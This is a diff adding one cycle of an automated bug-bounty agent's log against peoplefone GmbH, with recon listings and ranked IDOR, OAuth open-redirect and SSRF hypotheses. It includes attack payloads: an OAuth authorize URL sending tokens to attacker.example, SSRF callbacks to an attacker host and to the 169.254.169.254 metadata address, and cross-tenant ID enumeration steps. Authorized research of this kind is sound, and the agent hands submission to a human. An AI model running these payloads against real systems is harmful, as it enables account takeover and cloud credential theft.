@@ -12632,3 +12632,214 @@ STEP 6 — LEARNING
 
 STEP 7 — RISK
 [RISK] peoplefone GmbH: 82/100 — 41st frozen cycle; all live surfaces byte-identical. Sole report-ready finding (OAuth open-redirect/login-CSRF, triage VALID 7.4/9.1 conditional) remains UNSENT (valid-bugs 0); empty-lead triage defect persists (5+ runs), degrading the pre-submission validation gate. Configuration IDOR (85) + SSRF (78) stay live behind a bearer token proven unacquirable agent-side (register 500 global). Both lever lines collapse to the single human path: report submission + (if register recovers) token minting. Risk drops only on a valid-bugs increment; process risk holds it at 82.
+===== ANALYST bigpickle 2026-09-12 23:08:02 UTC =====
+[0m
+> build · big-pickle
+[0m
+[0m$ [0mls -la && ls art/ 2>/dev/null && ls *.md 2>/dev/null
+total 304
+drwxr-xr-x 12 runner runner   4096 Sep 12 23:05 .
+drwxr-xr-x  3 runner runner   4096 Sep 12 23:05 ..
+drwxr-xr-x  7 runner runner   4096 Sep 12 23:05 .git
+drwxr-xr-x  3 runner runner   4096 Sep 12 23:05 .github
+-rw-r--r--  1 runner runner   1772 Sep 12 23:05 README.md
+-rw-r--r--  1 runner runner     32 Sep 12 23:05 analyst-out.txt
+-rw-r--r--  1 runner runner 107728 Sep 12 23:05 analyst-prompt.txt
+-rw-r--r--  1 runner runner 103873 Sep 12 23:05 ctx.txt
+drwxr-xr-x  2 runner runner   4096 Sep 12 23:05 inventory
+drwxr-xr-x  2 runner runner   4096 Sep 12 23:05 knowledge
+drwxr-xr-x  2 runner runner   4096 Sep 12 23:05 leads
+-rw-r--r--  1 runner runner   7892 Sep 12 23:05 probe-results.md
+drwxr-xr-x  2 runner runner   4096 Sep 12 23:05 recon-notes
+drwxr-xr-x  2 runner runner   4096 Sep 12 23:05 reports
+drwxr-xr-x  2 runner runner   4096 Sep 12 23:05 reposcan-raw
+-rw-r--r--  1 runner runner   3268 Sep 12 23:05 scope.yml
+drwxr-xr-x  2 runner runner   4096 Sep 12 23:05 scripts
+-rw-r--r--  1 runner runner     33 Sep 12 23:05 state_bigpickle.json
+-rw-r--r--  1 runner runner     33 Sep 12 23:05 state_laguna.json
+-rw-r--r--  1 runner runner     33 Sep 12 23:05 state_ling3.json
+-rw-r--r--  1 runner runner     33 Sep 12 23:05 state_longcat.json
+-rw-r--r--  1 runner runner     33 Sep 12 23:05 state_mimo.json
+-rw-r--r--  1 runner runner     33 Sep 12 23:05 state_nemotron3.json
+drwxr-xr-x  2 runner runner   4096 Sep 12 23:05 triage
+[0m
+[0m$ [0mls -la reports/ triage/ leads/ knowledge/ 2>/dev/null
+knowledge/:
+total 60
+drwxr-xr-x  2 runner runner  4096 Sep 12 23:05 .
+drwxr-xr-x 12 runner runner  4096 Sep 12 23:05 ..
+-rw-r--r--  1 runner runner 50238 Sep 12 23:05 index.md
+
+leads/:
+total 1044
+drwxr-xr-x  2 runner runner   4096 Sep 12 23:05 .
+drwxr-xr-x 12 runner runner   4096 Sep 12 23:05 ..
+-rw-r--r--  1 runner runner 388606 Sep 12 23:05 lead-bigpickle.md
+-rw-r--r--  1 runner runner   3366 Sep 12 23:05 lead-laguna.md
+-rw-r--r--  1 runner runner   3300 Sep 12 23:05 lead-ling3.md
+-rw-r--r--  1 runner runner   3432 Sep 12 23:05 lead-longcat.md
+-rw-r--r--  1 runner runner     18 Sep 12 23:05 lead-mimo.md
+-rw-r--r--  1 runner runner 617115 Sep 12 23:05 lead-nemotron3.md
+-rw-r--r--  1 runner runner  34123 Sep 12 23:05 reposcan-peoplefone.md
+
+reports/:
+total 2212
+drwxr-xr-x  2 runner runner    4096 Sep 12 23:05 .
+drwxr-xr-x 12 runner runner    4096 Sep 12 23:05 ..
+-rw-r--r--  1 runner runner 1065150 Sep 12 23:05 analyst-bigpickle.log
+-rw-r--r--  1 runner runner   14322 Sep 12 23:05 analyst-laguna.log
+-rw-r--r--  1 runner runner   14256 Sep 12 23:05 analyst-ling3.log
+-rw-r--r--  1 runner runner   14388 Sep 12 23:05 analyst-longcat.log
+-rw-r--r--  1 runner runner  927914 Sep 12 23:05 analyst-nemotron3.log
+-rw-r--r--  1 runner runner    5479 Sep 12 23:05 hypotheses-bigpickle.txt
+-rw-r--r--  1 runner runner      51 Sep 12 23:05 hypotheses-laguna.txt
+-rw-r--r--  1 runner runner      50 Sep 12 23:05 hypotheses-ling3.txt
+-rw-r--r--  1 runner runner      52 Sep 12 23:05 hypotheses-longcat.txt
+-rw-r--r--  1 runner runner    9281 Sep 12 23:05 hypotheses-nemotron3.txt
+-rw-r--r--  1 runner runner  165901 Sep 12 23:05 hypotheses.md
+-rw-r--r--  1 runner runner    5969 Sep 12 23:05 valid-bugs.md
+
+triage/:
+total 372
+drwxr-xr-x  2 runner runner  4096 Sep 12 23:05 .
+drwxr-xr-x 12 runner runner  4096 Sep 12 23:05 ..
+-rw-r--r--  1 runner runner     0 Sep 12 23:05 .gitkeep
+-rw-r--r--  1 runner runner   146 Sep 12 23:05 run-2026-09-02-21-52.md
+-rw-r--r--  1 runner runner  2035 Sep 12 23:05 run-2026-09-02-23-50.md
+-rw-r--r--  1 runner runner   934 Sep 12 23:05 run-2026-09-03-02-51.md
+-rw-r--r--  1 runner runner   143 Sep 12 23:05 run-2026-09-03-07-45.md
+-rw-r--r--  1 runner runner   181 Sep 12 23:05 run-2026-09-03-12-34.md
+-rw-r--r--  1 runner runner   174 Sep 12 23:05 run-2026-09-03-16-40.md
+-rw-r--r--  1 runner runner   187 Sep 12 23:05 run-2026-09-03-19-27.md
+-rw-r--r--  1 runner runner   186 Sep 12 23:05 run-2026-09-03-21-53.md
+-rw-r--r--  1 runner runner  6531 Sep 12 23:05 run-2026-09-03-23-46.md
+-rw-r--r--  1 runner runner   211 Sep 12 23:05 run-2026-09-04-02-50.md
+-rw-r--r--  1 runner runner   230 Sep 12 23:05 run-2026-09-04-07-42.md
+-rw-r--r--  1 runner runner   149 Sep 12 23:05 run-2026-09-04-12-29.md
+-rw-r--r--  1 runner runner   149 Sep 12 23:05 run-2026-09-04-16-35.md
+-rw-r--r--  1 runner runner   212 Sep 12 23:05 run-2026-09-04-19-07.md
+-rw-r--r--  1 runner runner   163 Sep 12 23:05 run-2026-09-04-21-33.md
+-rw-r--r--  1 runner runner   178 Sep 12 23:05 run-2026-09-04-23-16.md
+-rw-r--r--  1 runner runner   213 Sep 12 23:05 run-2026-09-05-01-04.md
+-rw-r--r--  1 runner runner 16166 Sep 12 23:05 run-2026-09-05-05-55.md
+-rw-r--r--  1 runner runner   177 Sep 12 23:05 run-2026-09-05-09-55.md
+-rw-r--r--  1 runner runner  1421 Sep 12 23:05 run-2026-09-05-13-15.md
+-rw-r--r--  1 runner runner 11220 Sep 12 23:05 run-2026-09-05-16-09.md
+-rw-r--r--  1 runner runner   220 Sep 12 23:05 run-2026-09-05-18-22.md
+-rw-r--r--  1 runner runner   239 Sep 12 23:05 run-2026-09-05-20-44.md
+-rw-r--r--  1 runner runner   231 Sep 12 23:05 run-2026-09-05-22-37.md
+-rw-r--r--  1 runner runner 11210 Sep 12 23:05 run-2026-09-06-00-15.md
+-rw-r--r--  1 runner runner   148 Sep 12 23:05 run-2026-09-06-04-46.md
+-rw-r--r--  1 runner runner   207 Sep 12 23:05 run-2026-09-06-09-08.md
+-rw-r--r--  1 runner runner   163 Sep 12 23:05 run-2026-09-06-12-55.md
+-rw-r--r--  1 runner runner  1382 Sep 12 23:05 run-2026-09-06-15-58.md
+-rw-r--r--  1 runner runner   205 Sep 12 23:05 run-2026-09-06-18-09.md
+-rw-r--r--  1 runner runner   254 Sep 12 23:05 run-2026-09-06-20-28.md
+-rw-r--r--  1 runner runner   148 Sep 12 23:05 run-2026-09-06-22-18.md
+-rw-r--r--  1 runner runner   214 Sep 12 23:05 run-2026-09-07-00-05.md
+-rw-r--r--  1 runner runner   988 Sep 12 23:05 run-2026-09-07-04-50.md
+-rw-r--r--  1 runner runner   252 Sep 12 23:05 run-2026-09-07-09-56.md
+-rw-r--r--  1 runner runner   500 Sep 12 23:05 run-2026-09-07-15-31.md
+-rw-r--r--  1 runner runner   166 Sep 12 23:05 run-2026-09-07-19-23.md
+-rw-r--r--  1 runner runner   219 Sep 12 23:05 run-2026-09-07-22-16.md
+-rw-r--r--  1 runner runner 16188 Sep 12 23:05 run-2026-09-08-00-30.md
+-rw-r--r--  1 runner runner   250 Sep 12 23:05 run-2026-09-08-05-10.md
+-rw-r--r--  1 runner runner   164 Sep 12 23:05 run-2026-09-08-09-47.md
+-rw-r--r--  1 runner runner   186 Sep 12 23:05 run-2026-09-08-14-06.md
+-rw-r--r--  1 runner runner   210 Sep 12 23:05 run-2026-09-08-17-57.md
+-rw-r--r--  1 runner runner   146 Sep 12 23:05 run-2026-09-08-20-50.md
+-rw-r--r--  1 runner runner  1650 Sep 12 23:05 run-2026-09-08-23-10.md
+-rw-r--r--  1 runner runner   294 Sep 12 23:05 run-2026-09-09-01-16.md
+-rw-r--r--  1 runner runner   163 Sep 12 23:05 run-2026-09-09-06-04.md
+-rw-r--r--  1 runner runner   170 Sep 12 23:05 run-2026-09-09-11-31.md
+-rw-r--r--  1 runner runner   158 Sep 12 23:05 run-2026-09-09-15-16.md
+-rw-r--r--  1 runner runner   717 Sep 12 23:05 run-2026-09-09-18-41.md
+-rw-r--r--  1 runner runner   143 Sep 12 23:05 run-2026-09-09-21-29.md
+-rw-r--r--  1 runner runner   148 Sep 12 23:05 run-2026-09-09-23-30.md
+-rw-r--r--  1 runner runner   186 Sep 12 23:05 run-2026-09-10-01-25.md
+-rw-r--r--  1 runner runner   234 Sep 12 23:05 run-2026-09-10-06-37.md
+-rw-r--r--  1 runner runner   211 Sep 12 23:05 run-2026-09-10-11-48.md
+-rw-r--r--  1 runner runner   231 Sep 12 23:05 run-2026-09-10-15-48.md
+-rw-r--r--  1 runner runner   196 Sep 12 23:05 run-2026-09-10-18-55.md
+-rw-r--r--  1 runner runner   693 Sep 12 23:05 run-2026-09-10-21-24.md
+-rw-r--r--  1 runner runner  6151 Sep 12 23:05 run-2026-09-10-23-23.md
+-rw-r--r--  1 runner runner   250 Sep 12 23:05 run-2026-09-11-01-26.md
+-rw-r--r--  1 runner runner   242 Sep 12 23:05 run-2026-09-11-06-37.md
+-rw-r--r--  1 runner runner   389 Sep 12 23:05 run-2026-09-11-11-47.md
+-rw-r--r--  1 runner runner   172 Sep 12 23:05 run-2026-09-11-15-50.md
+-rw-r--r--  1 runner runner   151 Sep 12 23:05 run-2026-09-11-18-58.md
+-rw-r--r--  1 runner runner   148 Sep 12 23:05 run-2026-09-11-21-36.md
+-rw-r--r--  1 runner runner   176 Sep 12 23:05 run-2026-09-11-23-32.md
+-rw-r--r--  1 runner runner   256 Sep 12 23:05 run-2026-09-12-01-31.md
+-rw-r--r--  1 runner runner   217 Sep 12 23:05 run-2026-09-12-06-28.md
+-rw-r--r--  1 runner runner   197 Sep 12 23:05 run-2026-09-12-11-13.md
+-rw-r--r--  1 runner runner 15976 Sep 12 23:05 run-2026-09-12-14-13.md
+-rw-r--r--  1 runner runner  1047 Sep 12 23:05 run-2026-09-12-17-15.md
+-rw-r--r--  1 runner runner   148 Sep 12 23:05 run-2026-09-12-19-25.md
+-rw-r--r--  1 runner runner   143 Sep 12 23:05 run-2026-09-12-21-37.md
+-rw-r--r--  1 runner runner 10000 Sep 12 23:05 triage-run-2026-09-05-12-00.md
+[0m
+[0m→ [0mRead probe-results.md
+[0m→ [0mRead triage/run-2026-09-12-19-25.md
+[0m→ [0mRead triage/run-2026-09-12-21-37.md
+[0m→ [0mRead reports/valid-bugs.md
+[0m→ [0mRead reports/hypotheses-bigpickle.txt
+[0m→ [0mRead triage/run-2026-09-12-17-15.md
+STEP 1 — DELTA
+- NO_DELTA — all live surfaces byte-identical to prior cycle (api-doc 200, config-api+call-api docs 404, stateless authorize 404+attacker `redirect_uri` cookie, token GET 405/POST 401&500, register 500 global, portal 302); probe file flat since 2026-09-08.
+- NEW — triage `run-2026-09-12-19-25` and `run-2026-09-12-21-37` both received "No leads were provided" — empty-lead defect now 7+ consecutive runs, still consuming nothing from the 16:23/17:15Z lead emits; VALID gate remains unreconfirmable pre-submission.
+
+STEP 2 — PRIORITIZE
+- [PRIO] configuration-api.peoplefone.com,6.55,IDOR/BOLA
+- [PRIO] auth.peoplefone.com/oauth,6.35,AUTH/open-redirect
+- [PRIO] api.peoplefone.com 5 SSRF endpoints,6.10,SSRF
+
+STEP 3 — HYPOTHESES
+[HYP] Cross-tenant PBX takeover via Configuration API sequential identifier enumeration (8 resource types)
+class: IDOR
+asset: configuration-api.peoplefone.com/customer/voip/v1/{users,groups,ivrs,queues,numbers,smart-routings,callforwarding,manual-routing}/{identifier}
+confidence: 85
+reasoning: 235KB spec; numeric sequential ids; authorization-boundary statement present, enforcement unproven; UserResponse leaks sipUserName+email+address; all real backends 401-gated (docs 404); cross-model rank holds, zero counter-evidence; bearer proven unacquirable agent-side (register 500 global)
+evidence_needed: tenant-A bearer returns tenant-B {identifier} object via +-1 enumeration
+verify_steps: (authorized, read-only) GET /customer/voip/v1/users/{own_id+1}; repeat /numbers/{did}, /callforwarding/{id}; compare tenant markers
+impact: cross-tenant PBX takeover — SIP creds, PII, DID routing, billing fraud; CRITICAL
+testability: AUTH_HELPED
+[HYP] OAuth open-redirect + login-CSRF on auth (client_id=1), cookie-seeded variant
+class: AUTH
+asset: auth.peoplefone.com/oauth/authorize (+ /oauth/token)
+confidence: 62
+reasoning: stateless authorize 404 still Set-Cookie attacker redirect_uri (httponly/secure, Max-Age 34560000); warm-session authorize 302→/de_CH/login preserves arbitrary redirect_uri with implicit+PKCE accepted; token endpoint enforces client_secret for 1/4/5 (401) and 500s nonexistent ids — code-theft ATO falsified for confidential clients; triage VALID 7.4 (9.1 conditional)
+evidence_needed: warm-session response_type=token yields #access_token fragment to attacker redirect_uri
+verify_steps: (authorized, human) portal login to warm session, GET /oauth/authorize?client_id=1&response_type=token&redirect_uri=https://attacker.example/cb — inspect 302 chain for fragment; else file as open-redirect+login-CSRF
+impact: silent ATO of portal users if implicit fragment; open-redirect+login-CSRF otherwise; CRITICAL conditional
+testability: HUMAN_ONLY
+[HYP] Cloud metadata/IAM theft via 5 webhook/callback endpoints with zero host/scheme validation
+class: SSRF
+asset: api.peoplefone.com sms/callbackUrl + call-api smart-routings/{id}/webhook + uaCSTA callbackUrl/monitoringCallbackUrl + configuration-api external-number-lookup webhookUrl
+confidence: 78
+reasoning: format:uri with no enum/allowlist across 5 endpoints; External Number Lookup forwards Authorization/X-API-Key to attacker URL; deprecated External Routing (2026-09-30) repeats pattern; zero counter-evidence across frozen cycles
+evidence_needed: post-auth callback reaches attacker host; 169.254.169.254/private ranges unfiltered
+verify_steps: (authorized) POST SMS callbackUrl=https://attacker/x and http://169.254.169.254; attacker-side receipt only
+impact: metadata/IAM theft, SIP/PBX internal pivot, call-metadata leak; CRITICAL
+testability: AUTH_HELPED
+
+STEP 4 — SELF-CRITIQUE
+- [FINAL] Configuration API IDOR (85) — survivors; sole top-slot, token-gated, triage HOLD.
+- [FINAL] OAuth open-redirect/login-CSRF (62) — survivors; triage VALID 7.4 (9.1 conditional), report-ready.
+- [FINAL] SSRF 5 endpoints (78) — survivors; triage HOLD pending token.
+- [PARKED] BUSLOGIC queue agents: spec-silent on membership validation, formally INVALID 2026-09-05.
+- [PARKED] MISCONFIG subdomain takeover: 19 guessed subdomains NXDOMAIN, no wildcard, all CNAMEs → managed Cloudflare; no dangling targets (40+ cycles).
+
+STEP 5 — NEXT ACTION
+[NEXT] HUMAN: Submit the OAuth open-redirect/login-CSRF finding to bugs.olivermaicher.eu now — 42nd frozen cycle, triage VALID 7.4 (9.1 conditional), valid-bugs still 0. Payload: `GET /oauth/authorize?client_id=1&response_type=token&redirect_uri=https://attacker.example/cb&scope=openid`; attach fresh re-verify trace (404 still Set-Cookie `redirect_uri=<attacker>`, Max-Age=34560000, httponly, secure) + warm-session 302→/de_CH/login preserving arbitrary redirect_uri with implicit+PKCE accepted; state token endpoint enforces client_secret for 1/4/5 (code-theft ATO falsified) so severity rests at open-redirect/login-CSRF absent implicit-fragment reproduction; include PoC, impact, CVSS 7.4, contact. Flag the empty-lead triage defect (7th consecutive empty run at 21:37Z, still failing to consume the 16:23Z emit) so the VALID gate can be re-fixed and re-confirmed post-submission.
+
+STEP 6 — LEARNING
+[LEARN] ACCEPTED AUTH @ auth.peoplefone.com: register 500 / token GET 405 + POST(client_id=1)→401 + POST(no-body)→500 / stateless authorize 404+attacker redirect_uri cookie / api-doc 200 — NO_DELTA; 42nd frozen cycle; triage VALID on open-redirect/login-CSRF.
+[LEARN] ACCEPTED IDOR @ configuration-api {identifier} CRUD: no counter-evidence; rank holds; token-gated (42nd frozen cycle); triage HOLD pending bearer token.
+[LEARN] ACCEPTED SSRF @ 5 callback endpoints: no counter-evidence; retained pending token (42nd frozen cycle); triage HOLD.
+[LEARN] ACCEPTED OTH @ pipeline: triage 19:25Z + 21:37Z both received EMPTY leads — empty-lead defect now 7+ consecutive runs despite prior lead emits; operational blocker to pre-submission VALID re-confirmation.
+[LEARN] ACCEPTED OTH @ inventory: call-api.peoplefone.com/services/api-doc/ 404 reconfirmed; config-api docs 404 reconfirmed; all 8-spec backends match the 401/404-gated real-backend pattern.
+[LEARN] REJECTED MISCONFIG @ *.peoplefone.com: unchanged — 19 guessed subdomains all NXDOMAIN, no wildcard, no dangling CNAME targets; reposcan yields no in-scope surface.
+
+STEP 7 — RISK
+[RISK] peoplefone GmbH: 82/100 — 42nd frozen cycle; all live surfaces byte-identical. Sole report-ready finding (OAuth open-redirect/login-CSRF, triage VALID 7.4/9.1 conditional) remains UNSENT (valid-bugs 0). Empty-lead triage defect now 7+ consecutive runs (19:25Z, 21:37Z confirmed this cycle), keeping the pre-submission VALID gate degraded. Configuration IDOR (85) + SSRF (78) stay live behind a bearer token proven unacquirable agent-side (register 500 global). Both lever lines collapse to the single human path: report submission + (if register recovers) token minting. Risk drops only on a valid-bugs increment; process risk holds it at 82.
